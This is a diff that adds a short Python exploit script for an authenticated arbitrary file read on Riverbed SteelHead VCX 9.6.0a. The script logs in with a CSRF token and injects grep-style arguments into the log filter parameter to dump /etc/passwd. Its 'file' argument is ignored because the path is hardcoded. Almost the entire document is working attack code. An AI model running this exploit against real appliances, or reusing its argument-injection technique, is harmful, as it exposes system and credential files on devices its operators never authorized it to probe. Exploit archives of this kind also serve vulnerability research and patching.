@@ -1,0 +1,37 @@
+# Exploit title : Arbitry file reading by authenticated users on Riverbed SteelHead VCX
+# Vendor: Riverbed
+# Author: Gregory DRAPERI <gregory.draper_at_gmail.com>
+# Date: 03/2017
+# Software Link: https://www.riverbed.com/gb/products/steelhead/Free-90-day-Evaluation-SteelHead-CX-Virtual-Edition.html
+# Version: SteelHead VCX (VCX255U) (x86_64) 9.6.0a
+import sys
+import requests
+
+
+def exploit(address, login, password,file):
+    s = requests.Session()
+    url = address
+    try:
+        r1 = s.get(url+"/login?next=/");
+        cookies = requests.utils.dict_from_cookiejar(s.cookies);
+        csrf = cookies["csrftoken"]
+        authentication = {'csrfmiddlewaretoken': csrf, '_fields': "{\"username\":\""+login+"\",\"password\":\""+password+"\",\"legalAccepted\":\"N/A\",\"userAgent\":\"\"}"}
+        r2 = s.post(url+"/login?next=/",  data=authentication)
+        r3 = s.get(url+"/modules/common/logs?filterStr=msg:-e .* /etc/passwd ")
+        print r3.text
+
+    except Exception as e:
+        print "\n! ERROR: %s" % e
+    return False
+
+
+
+if len(sys.argv) < 4:
+    print "Usage: exploit.py <target> <login> <password> <file>\n"
+    print "Example: exploit.py http://192.168.1.2 admin password /etc/passwd\n"
+    quit()
+target = sys.argv[1]
+login = sys.argv[2]
+password = sys.argv[3]
+file = sys.argv[4]
+exploit(target,login,password,file)
